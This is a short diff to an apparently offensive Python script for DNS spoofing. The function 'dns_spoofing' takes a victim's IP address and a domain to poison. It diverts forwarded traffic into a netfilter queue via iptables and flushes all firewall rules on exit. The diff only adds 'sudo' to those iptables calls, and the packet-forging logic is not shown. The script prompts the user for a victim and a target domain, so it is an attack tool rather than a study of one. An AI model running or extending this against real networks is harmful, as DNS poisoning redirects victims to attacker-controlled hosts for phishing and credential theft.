@@ -18,7 +18,7 @@ def dns_spoofing(victim_ip, domain, host, output = False):
     QUEUE_NUM = 0
     
     # Step 1
-    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
     
     # Step 2
     queue = NetfilterQueue()
@@ -31,7 +31,7 @@ def dns_spoofing(victim_ip, domain, host, output = False):
         queue.run()
     except KeyboardInterrupt:
         # Step 5
-        os.system("iptables --flush")
+        os.system("sudo iptables --flush")
 
 victim_ip = input("Enter victim's IP address: ")
 domain = input("Enter the domain to poison: ")
